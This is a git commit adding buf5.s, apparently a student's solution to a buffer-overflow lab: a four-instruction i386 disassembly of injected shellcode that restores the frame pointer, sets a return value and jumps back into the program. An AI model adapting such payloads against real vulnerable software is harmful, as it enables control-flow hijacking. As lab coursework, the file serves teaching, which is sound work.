c82295454f59e051deba3e97824eaf4cb9ddb692
Bekuuu <75431869+Bekuuu@users.noreply.github.com>
2021-05-02 19:34:56 +0800

    Create buf5.s

---
+++ buflab/buf5.s
@@ -0,0 +1,11 @@
+
+buf5.o：     文件格式 elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
+   4:	b8 48 60 94 65       	mov    $0x65946048,%eax
+   9:	68 3a 8e 04 08       	push   $0x8048e3a
+   e:	c3                   	ret    
